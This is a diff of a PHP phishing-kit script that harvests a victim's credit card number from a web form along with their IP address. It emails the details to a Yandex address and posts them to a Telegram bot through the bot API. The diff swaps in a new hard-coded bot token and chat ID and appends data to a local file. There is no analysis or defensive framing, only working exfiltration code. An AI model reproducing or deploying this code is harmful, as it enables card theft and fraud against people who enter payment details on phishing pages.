@@ -18,13 +18,13 @@ $hello   .= "Hello Bro its Come   : ".$_POST['cc_number']."\n";
 //$message .= "|HostName : ".$hostname."\n";
 $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
 $message .= "|----------||--------------|\n";
-$send = "machinoumohamed@yandex.com , ";
+$send = "@yandex.com , ";
 $subject = "From:  [ $ip ]";
 {
 mail("$send", "$subject", $hello);
-$token = "1471281489:AAEbxSXQjFX1LdEi7zJ66aZxCOVHbS7EDbg";
-file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1497188295&text=" . urlencode($message)."" );
-file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1497188295&text=" . urlencode($hello)."" );
+$token = "1588168678:AAElp5lIsWo5q4GqdOCeCFxXyv4nLeO8zss";
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-462207069&text=" . urlencode($message)."" );
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-462207069&text=" . urlencode($hello)."" );
 }
 
 $f = fopen("../python/python.php", "a");
